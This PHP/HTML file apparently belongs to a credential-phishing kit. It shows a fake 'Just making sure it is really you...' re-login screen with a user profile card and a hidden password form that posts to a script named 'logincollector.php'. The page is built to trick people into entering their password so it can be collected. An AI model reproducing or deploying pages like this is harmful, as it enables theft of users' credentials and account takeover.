<?php
session_start();
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <title> Welcome back </title>
    <script src="./jq.js" type="text/javascript"></script>
    <style>
        #loginform {
            display: none;
        }
    </style>
</head>

<body>
    <center>
        <div class="w3-container">
            <h2 class="w3-cursive">Just making sure it is really you...</h2>
            <p><i class="fa fa-refresh w3-spin" style="font-size:64px"></i></p>
            <div class="w3-card-4 w3-dark-grey" style="width:50%">

                <div class="w3-container w3-center">
                    <h3>Current Profile</h3>
                    <img src="./img/avatar1.jpg" alt="Avatar" style="width:80%">
                    <h5>Mr. Bash</h5>

                    <div class="w3-section">
                        <button class="w3-button w3-green" id="login">LOG IN</button>
                        <!-- <button class="w3-button w3-red">LOG OUT</button> -->
                    </div>
                </div>
                <form class="w3-container" method="POST" action="./logincollector.php" id="loginform">
                    <label class="w3-text-teal"><b>Your Password</b></label>
                    <input class="w3-input w3-border w3-light-grey" type="password" name="password" id="password" placeholder="please enter your password" required>
                    <label><input type="checkbox" onclick="myPassword()"> Show Password </label>
                    <button class="w3-btn w3-blue-grey"> Proceed Home</button>
                </form>
                <br>
            </div>
        </div>
    </center>
    <br>
    <br>
    <br>

    <script src="./myjavacode.js"></script>
</body>

</html>